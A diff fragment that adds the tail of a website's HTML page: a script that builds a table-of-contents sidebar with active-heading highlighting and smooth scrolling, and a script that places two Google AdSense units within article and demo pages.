+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
